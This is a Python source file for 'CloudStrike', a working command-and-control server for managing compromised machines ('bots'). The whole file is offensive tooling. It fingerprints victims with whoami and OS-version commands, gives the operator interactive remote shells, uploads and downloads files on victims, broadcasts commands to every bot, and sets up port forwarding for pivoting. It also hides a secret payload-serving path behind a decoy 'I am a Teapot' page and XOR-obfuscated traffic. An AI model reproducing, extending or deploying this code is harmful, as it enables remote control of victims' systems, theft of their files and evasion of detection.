#!/usr/bin/python3
#TODO:
#ROUTE TCP PACKETS including /magic/ to the webserver

FLASK=True

import socket
from random import randint, choice
import threading
from queue import Queue
import sys
import select
import os
import string
try:
    from flask import *
    from werkzeug.utils import secure_filename
    global MAGIC
    MAGIC=""
    for c in range(20):
        MAGIC+=chr(randint(97, 122))
except:
    import http.server
    import socketserver
    FLASK=False
from time import sleep, time
import logging
import re

C2_ADDR="0.0.0.0"
C2_PORT=1337
C2_WEB_PORT=8001
HOME="/home/user/cloudstrike/" #needs to end with a '/' !!!

banner="""
░█████╗░██╗░░░░░░█████╗░██╗░░░██╗██████╗░░██████╗████████╗██████╗░██╗██╗░░██╗███████╗
██╔══██╗██║░░░░░██╔══██╗██║░░░██║██╔══██╗██╔════╝╚══██╔══╝██╔══██╗██║██║░██╔╝██╔════╝
██║░░╚═╝██║░░░░░██║░░██║██║░░░██║██║░░██║╚█████╗░░░░██║░░░██████╔╝██║█████═╝░█████╗░░
██║░░██╗██║░░░░░██║░░██║██║░░░██║██║░░██║░╚═══██╗░░░██║░░░██╔══██╗██║██╔═██╗░██╔══╝░░
╚█████╔╝███████╗╚█████╔╝╚██████╔╝██████╔╝██████╔╝░░░██║░░░██║░░██║██║██║░╚██╗███████╗
░╚════╝░╚══════╝░╚════╝░░╚═════╝░╚═════╝░╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝╚═╝╚═╝░░╚═╝╚══════╝
Made by Terraminator                                                                                          
"""

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


global bots
global LIMIT
global routes

LIMIT=False
bots=[]
routes=[]
threads=[]
socks=[]

logger = logging.getLogger() 
logger.disabled = True


def enc(data):
    try:
        if type(data)==bytes:
            try:
                data=data.decode()
                tmp=""
            except:
                tmp=""
                for c in data:
                    tmp+=chr(c^0x1f)
                return(tmp)
        else:
            data=str(data)
            tmp=""
        for c in data:
            tmp+=chr(ord(c)^0x1f)
    except Exception as e:
        print(e)
        return("err")
    return(tmp.encode())

def dec(data):
    try:
        if type(data)==bytes:
            data=data.decode()
    except:
        return(enc(data))
    return(enc(data).decode())


def _send(conn, data, e=True):
    sleep(0.01)
    if e:
        if type(data)==bytes: 
            data+=b"EOF"
        else:
            data+="EOF"
        conn.send(enc(data))
    else:
        if type(data)==bytes:
            conn.send(data)
        else:
            conn.send(data.encode())

def b(data):
    if type(data)==str:
        return(data.encode())
    elif type(data)==bytes:
        return(data)
    else:
        return(b"unknown datatype in b(data)")

def _recv(conn, e=True):
    data=conn.recv(4096)
    if e:
        while not b"EOF" in b(dec(data)):
            data+=conn.recv(4096)
        data=b(dec(data)).replace(b"EOF", b"")
        try:
            return(data.decode())
        except:
            return(data)
    else:
        data=data.decode()
    return(data)

def log(self, format, *args):
    pass

def secho(text, file=None, nl=None, err=None, color=None, **styles):
    pass

def echo(text, file=None, nl=None, err=None, color=None, **styles):
    pass

def l(p, ip):
    with open("web_log.txt", "a+") as f:
        f.write(f"path: {p} accessed by {ip} at {time()}\n")

def allowed_file(filename):
    ALLOWED_EXTENSIONS = {'txt', 'pdf', 'png', 'jpg', 'jpeg', 'gif', 'mp4', 'mp3', 'wav', 'docx', 'dll', 'exe', 'json', 'yaml', 'sqlite'}
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

def web_srv(q):
    yeah=False
    if not FLASK:
        os.chdir("static")
        handler = http.server.SimpleHTTPRequestHandler
        handler.log_message=log
        try:
            with socketserver.TCPServer((C2_ADDR, C2_WEB_PORT), handler) as httpd:
                print(f"{bcolors.OKBLUE}file server started at {C2_ADDR}:{C2_WEB_PORT}\n")
                httpd.serve_forever()
        except:
            print(f"{bcolors.WARNING}file server failed to start!")
        while not yeah:
            sleep(3)
            try:
                with socketserver.TCPServer((C2_ADDR, C2_WEB_PORT), handler) as httpd:
                    print(f"{bcolors.OKBLUE}file server started at {C2_ADDR}:{C2_WEB_PORT}\n")
                    print(f"{bcolors.WARNING}WARNING: NO_MAGIX_PREFIX_FOR_WEBSERVER_NEEDED!")
                    yeah=True
                    httpd.serve_forever()
            except:
                pass
    else:
        global MAGIC
        import click
        click.echo = echo
        click.secho = secho
        logging.getLogger("werkzeug").disabled = True
        logging.getLogger("geventwebsocket.handler").disabled = True
        from flask.logging import default_handler

        app = Flask(__name__)
        UPLOAD_FOLDER = HOME+"downloads/"
        app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER 
        app.logger.removeHandler(default_handler)
        log = logging.getLogger('werkzeug')
        log.disabled = True
        yeah=False
        os.chdir("static")
        index_t = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Teapot v0.2</title>
        </head>
        <body>
            <h1>Error 418 I am a Teapot</h1>
        </body>
        </html>
        """
        @app.route("/")
        def index():
            l("/",request.remote_addr)
            return(render_template_string(index_t), 418)
        @app.route("/<r>")
        def idk(r):
            l(f"/{r}",request.remote_addr)
            charset = string.ascii_letters + string.digits  + "\n"
            random_string = ''.join(choice(charset) for _ in range(randint(0, randint(1000, 10000))))
            return(render_template_string(random_string), 404)
        @app.route("/<a>/<b>")
        def idk2(a,b):
            l(f"/{a}/{b}",request.remote_addr)
            charset = string.ascii_letters + string.digits  + "\n"
            random_string = ''.join(choice(charset) for _ in range(randint(0, randint(1000, 10000))))
            return(render_template_string(random_string), 404)
        @app.route("/<a>/<b>/<c>")
        def idk3(a,b,c):
            l(f"/{a}/{b}/{c}",request.remote_addr)
            charset = string.ascii_letters + string.digits  + "\n"
            random_string = ''.join(choice(charset) for _ in range(randint(0, randint(1000, 10000))))
            return(render_template_string(random_string), 404)


        #ALLOWS FILE UPLOADS with: url -F "file=@test.txt" -X POST 192.168.178.73:1337/ifncdnlgtgayspkpnpnm/up
        @app.route(f"/{MAGIC}/<path>", methods=["GET", "POST"])
        def put(path):
            if request.method=="GET":
                l(f"/{MAGIC}/{path}",request.remote_addr)
                return(send_from_directory(directory=HOME+"static/", path=secure_filename(path)), 404)
            elif request.method=="POST" and path=="up":
                return("temporarily disabled!")
                l(f"/{MAGIC}/{path}",request.remote_addr)
                # check if the post request has the file part
                if 'file' not in request.files:
                    print("file not in request")
                    charset = string.ascii_letters + string.digits  + "\n"
                    random_string = ''.join(choice(charset) for _ in range(randint(0, randint(1000, 10000))))
                    return(render_template_string(random_string), 404)
                file = request.files['file']
                if file.filename == '':
                    charset = string.ascii_letters + string.digits  + "\n"
                    random_string = ''.join(choice(charset) for _ in range(randint(0, randint(1000, 10000))))
                    return(render_template_string(random_string), 404)
                if file and allowed_file(file.filename):
                    filename = secure_filename(file.filename)
                    file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
                    charset = string.ascii_letters + string.digits  + "\n"
                    random_string = ''.join(choice(charset) for _ in range(randint(0, randint(1000, 10000))))
                    return(render_template_string(random_string), 404)
                else:
                    charset = string.ascii_letters + string.digits  + "\n"
                    random_string = ''.join(choice(charset) for _ in range(randint(0, randint(1000, 10000))))
                    return(render_template_string(random_string), 404)

        print(f"{bcolors.OKBLUE}trying to start file server at {C2_ADDR}:{C2_WEB_PORT}\nMAGIC: {MAGIC}")
        app.run(host=C2_ADDR, port=C2_WEB_PORT)
        while True:
            q.get()
            try:
                app.run(host=C2_ADDR, port=C2_WEB_PORT)
            except Exception as e:
                print(e)
                pass

def handle_clients(conn, addr):
    global bots
    e=True
    socks.append(conn)
    conn.settimeout(5)
    try:
        arch=dec(_recv(conn, False).rstrip("\n"))
    except:
        arch="unknown"
    conn.settimeout(None)
    a=arch.replace("\nEOF", "")
    if a=="linux":
        _send(conn, MAGIC + "\n")
        _send(conn, "cat /etc/issue\n")
        issue=_recv(conn).rstrip("\n")
        _send(conn, "whoami\n")
        usr=_recv(conn).rstrip("\n")
        arch=a
    elif a=="windows":
        _send(conn, MAGIC + "\n")
        _send(conn, "ver\n")
        issue=_recv(conn).rstrip("\n")
        _send(conn, "whoami\n")
        usr=_recv(conn).rstrip("\n").lstrip("\n")
        try:
            issue=re.findall('Microsoft Windows \[Version.*\]', issue, re.M)[0].replace("\n", "")
        except:
            print("failed to identify issue", issue)
            issue="Microsoft Windows"
        try:
            usr=re.findall('\\.*\>.*\n.*', usr, re.M)[0].lstrip(">\n").rstrip("\n").split("\n")[1]
        except:
            if len(usr.strip())<1:
                print("failed to identify usr", usr)
                usr="unknown"
            else:
                usr=usr.strip()
        arch=a
    else:
        e=False
        arch=dec(arch).rstrip("\n")
        if arch=="linux":
            _send(conn, MAGIC + "\n", False) #to be added in beacon!!!
            _send(conn, "cat /etc/issue\n", False)
            issue=_recv(conn, False).rstrip("\n")
            _send(conn, "whoami\n")
            usr=_recv(conn, False).rstrip("\n")
        elif arch=="windows":
            _send(conn, MAGIC + "\n", False) #to be added in beacon!!!
            _send(conn, "ver\n", False)
            issue=_recv(conn, False).rstrip("\n")
            _send(conn, "whoami\n", False)
            usr=_recv(conn, False).rstrip("\n").lstrip("\n")
            try:
                issue=re.findall('Microsoft Windows \[Version.*\]', issue, re.M)[0].replace("\n", "")
            except:
                print("failed to identify issue", issue)
                issue="Microsoft Windows"
            try:
                usr=re.findall('\\.*\>.*\n.*', usr, re.M)[0].lstrip(">\n").rstrip("\n").split("\n")[1]
            except:
                if len(usr.strip())<1:
                    print("failed to identify usr", usr)
                    usr="unknown"
                else:
                    usr=usr.strip()
        else:
            print(f"{bcolors.FAIL}unknown arch/not a beacon!")
            arch="unknown"
            issue="unknown"
            _send(conn, "whoami\n", False)
            
            usr=_recv(conn, False).rstrip("\n")
            if len(usr.rstrip("\n"))>1:
                if len(usr.rstrip("\n"))>20:
                    usr="unknown"
                print("connection to unknown system established in plain mode!\n")
            else:
                print("connection could not be established!")
                return(0)
    bots.append((conn,addr, issue, usr, e))
    print(f"{bcolors.OKGREEN}\033[FNew connection{'(encoded)' if e else '(plain)'}: {usr}@{addr[0]} {issue}")

def server(*settings):
	settings = list(settings)
	try:
		dock_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		dock_socket.bind(('0.0.0.0', int(settings[0])))
		dock_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		dock_socket.listen(5)
		while True:
			client_socket = dock_socket.accept()[0]
			server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			server_socket.connect((settings[1], int(settings[2])))
			w1 = threading.Thread(target=forward, args=(client_socket, server_socket))
			threads.append(w1)
			w1.start()
			w2=threading.Thread(target=forward, args=(server_socket, client_socket))
			threads.append(w2)
			w2.start()
	finally:
		t = threading.Thread(target=server, args=(settings))
		threads.append(t)
		t.start()

def forward(source, destination):
	string = ' '
	try:
		while string:
			string = source.recv(1024)
			if string:
				destination.sendall(string)
			else:
				source.shutdown(socket.SHUT_RD)
				destination.shutdown(socket.SHUT_WR)
	except:
		pass

def forward_to_websrv(conn, addr, welcome):
    c=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    c.connect((C2_ADDR, C2_WEB_PORT))
    c.send(welcome)
    c.settimeout(5)
    try:
        while True:
            r=c.recv(4096)
            if r!=b"":
                conn.send(r)
    except:
        c.settimeout(None)
        c.close()
        conn.close()


def wait_for_connections(s):
    global bots
    global LIMIT
    while True:
        conn, addr = s.accept()
        try:
            conn.settimeout(0.5)
            welcome=conn.recv(4096)
            conn.settimeout(None)
        except Exception as e:
            welcome=b""
        if f"/{MAGIC}/".encode() in welcome:
            t=threading.Thread(target=forward_to_websrv, args=(conn, addr,welcome))
            t.daemon=True
            t.start()
            threads.append(t)
        else:
            if (LIMIT and len(bots)<=LIMIT-1) or not LIMIT:
                t=threading.Thread(target=handle_clients, args=(conn, addr,))
                t.daemon=True
                t.start()
                threads.append(t)
            else:
                conn.close()

def i(c, q, e=True):
    while True:
        try:
            msg=_recv(c, e)
            q.put("\n"+ msg)
        except:
            q.put("Connection lost!")
            return(0)

def o(c, q, e=True):
    while True:
        try:
            msg=b(q.get())
            _send(c, msg, e)
        except:
            pass

def console(id):
    global bots
    global LIMIT
    c=bots[id-1][0]
    addr=bots[id-1][1]
    issue=bots[id-1][2]
    usr=bots[id-1][3]
    e=bots[id-1][4]
    print(f"{bcolors.OKCYAN}Connected to {usr}@{addr[0]} {issue}!")
    qi=Queue()
    qo=Queue()
    ti=threading.Thread(target=i, args=(c, qi,e,))
    ti.start()
    to=threading.Thread(target=o, args=(c, qo,e,))
    to.start()
    while True:
        while sys.stdin in select.select([sys.stdin], [], [], 0)[0]:
            line = sys.stdin.readline()
            if line:
                if line.rstrip("\n")=="detach":
                    return(0)
                elif line.rstrip("\n")=="clear" or line.rstrip("\n")=="cls":
                    os.system("clear")
                elif "upload" in line:
                    if not e:
                        print("upload is not avaiable for plain connections!")
                    elif(len(line.split(" "))!=2):
                        print(f"{bcolors.WARNING}usage: upload <dest>")
                    else:
                        if "upload" not in line.split(" ")[0]:
                            qo.put(line)
                        elif not os.path.isfile(os.getcwd() + "/" + line.split(" ")[1].replace("\n", "")):
                            print(f"{bcolors.WARNING}file not found!{bcolors.OKBLUE}")

                        else:
                            dest=line.split(" ")[1]
                            with open(os.getcwd() + "/" + str(dest.replace("\n", "")), "rb") as f:
                                data=f.read()
                                print("uploading {}...\n".format(dest.replace("\n", "")))
                            qo.put("upload {}\n".format(dest.replace("\n", "")))
                            qo.put(data + b"\n")
                elif "download" in line:
                    if not e:
                        print("download is not avaiable for plain connections!")
                    elif(len(line.split(" "))!=2):
                        print(f"{bcolors.WARNING}usage: download <src>")
                    else:
                        if "download" not in line.split(" ")[0]:
                            qo.put(line)
                        else:
                            src=line.split(" ")[1]
                            qo.put("download {}\n".format(src))
                            data=b(qi.get())
                            if b"failed" in data:
                                print(f"{bcolors.WARNING}download failed!")
                            else:
                                if len(src.replace("\n", "").split("/"))!=0:
                                    if not os.path.exists(os.getcwd() + "/../downloads/" + "/".join(src.replace("\n", "").split("/")[:-1])):
                                        path=os.getcwd() + "/../downloads/" + "/".join(src.replace("\n", "").split("/")[:-1])
                                        os.makedirs(path)
                                    else:
                                        path=""
                                with open(os.getcwd() + "/../downloads/" + path + str(src.replace("\n", "")), "wb") as f:
                                    f.write(data)
                                print("downloaded {} to {}".format(src, os.getcwd().replace("/static/", "") + "/downloads/" + src.replace("\n", "")))
                    
                elif line.rstrip("\n")=="exit":
                    try:
                        bots.remove((c, addr, issue, usr, e))
                        _send(c, "exit\n", e)
                    except:
                        pass
                    return(0)
                else:
                    qo.put(line)
        try:
            print(bcolors.OKBLUE + qi.get(False), end="\033[F")
        except:
            pass


def main():
    global bots
    global LIMIT
    global routes
    if os.path.exists("static/web_log.txt"): os.unlink("static/web_log.txt")
    sys.stdout.write("\x1b[8;{rows};{cols}t".format(rows=24, cols=90)) #resize terminal to output banner correctly
    print(bcolors.OKCYAN + banner)
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((C2_ADDR, C2_PORT))
    s.listen()
    socks.append(s)
    t=threading.Thread(target=wait_for_connections, args=(s,))
    t.daemon=True
    t.start()
    threads.append(t)
    web_r=Queue()
    t=threading.Thread(target=web_srv, args=(web_r,))
    t.daemon=True
    t.start()
    threads.append(t)
    sleep(0.5)

    while True:
        print(bcolors.OKCYAN, end="")
        cmd=input("cloudstrike> ").lower()
        if cmd=="list" or cmd=="ps":
            for i in range(1, len(bots)+1):
                print(f"{bcolors.OKBLUE}[{i}] {bots[i-1][3]}@{bots[i-1][1][0]} {bots[i-1][2]}")
        elif "use" in cmd:
            if len(cmd.split())<2:
                print(f"{bcolors.WARNING}Usage: use <id>")
            else:
                id=int(cmd.split()[1])
                if id>len(bots):
                    print(f"{bcolors.WARNING}Invalid ID")
                else:
                    console(id)
        elif "limit" in cmd:
            if cmd == "limit":
                print("current limit:", LIMIT)
            elif len(cmd.split())<2:
                print(f"{bcolors.WARNING}Usage: limit <number>")
            else:
                if cmd.split()[1]=="false" or cmd.split()[1]=="off":
                    LIMIT=False
                    print(f"{bcolors.OKBLUE}limit disabled")
                LIMIT=int(cmd.split()[1])
                print(f"{bcolors.OKBLUE}limit set to {LIMIT}")
        elif "listen" in cmd:
            if len(cmd.split())!=2:
                print(f"{bcolors.WARNING}Usage: listen <port>")
            else:
                try:
                    port=int(cmd.split()[1])
                    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    s.bind((C2_ADDR, port))
                    s.listen()
                    socks.append(s)
                    t=threading.Thread(target=wait_for_connections, args=(s,))
                    t.daemon=True
                    t.start()
                    threads.append(t)
                except:
                    print(f"{bcolors.WARNING}listen failed")
        elif "connect" in cmd:
                cmd=cmd.split(" ")
                if len(cmd)!=3:
                    print(f"{bcolors.WARNING}Usage: connect <ip> <port>")
                else:
                    addr=(str(cmd[1]), int(cmd[2]))
                    conn=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    try:
                        conn.connect(addr)
                        t=threading.Thread(target=handle_clients, args=(conn, addr,))
                        t.daemon=True
                        t.start()
                        threads.append(t)
                    except:
                        print(f"{bcolors.WARNING}cant connect to {addr[0]}:{addr[1]}")

        elif cmd == "restart web":
            print("restarting web server...")
            web_r.put("restart")
        
        elif "delete" in cmd or "kill" in cmd:
            if len(cmd.split())<2:
                if "delete" in cmd:
                    print(f"{bcolors.WARNING}usage: delete <id>")
                else:
                    print(f"{bcolors.WARNING}usage: kill <id>")
            else:
                id=int(cmd.split()[1])
                if id>len(bots):
                    print(f"{bcolors.WARNING}invalid ID")
                else:
                    bots[id-1][0].close()
                    bots.remove(bots[id-1])

        elif "broadcast" in cmd:
            if len(cmd.split())<2:
                print(f"{bcolors.WARNING}usage: broadcast <message>")
            else:
                msg=cmd.split("broadcast ")[1]
                for bot in bots:
                    _send(bot[0], msg+"\n", bot[4])
                if msg=="exit":
                    for bot in bots:
                        bot[0].close()
                    bots=[]

        elif "forward" in cmd:
                settings = cmd.replace("forward ", "").split(":")
                if len(settings) != 3:
                    print("usage: forward local_port:dest:dest_port")
                else:
                    print("0.0.0.0:" + str(settings[0]) + " -> " + str(settings[1]) + ":" + str(settings[2]))
                    routes.append("0.0.0.0:" + str(settings[0]) + " -> " + str(settings[1]) + ":" + str(settings[2]))
                    t = threading.Thread(target=server, args=(settings))
                    t.start()

        elif cmd=="routes":
            for r in routes:
                print(r)
                
        elif cmd=="read_weblog":
            if not os.path.exists(f"{HOME}static/web_log.txt"):
                print("no log there yet!")
            else:
                with open(f"{HOME}static/web_log.txt", "r") as f:
                    print(f.read())

        elif cmd=="magic":
            print("magic prefix: ", MAGIC)

        elif cmd=="clear":
            os.system("clear")

        elif cmd=="help":
            print(f"{bcolors.OKBLUE}use <id>\nlist\nps\ndelete <id>\nkill <id>\nconnect <ip> <port>\nlisten <port>\nforward local_port:dest:dest_port\nroutes\nrestart web\nread_weblog\nmagic\nclear\nbroadcast\nexit")

        elif cmd=="exit":
            try:
                for bot in bots:
                    _send(bot[0], "exit\n", bot[4])
            except:
                pass
            for so in socks:
                so.close()
            
            sys.exit(0)
        elif cmd != "":
            print(f"{bcolors.WARNING}unknown command")


if __name__=='__main__':
    os.chdir(HOME)
    main()
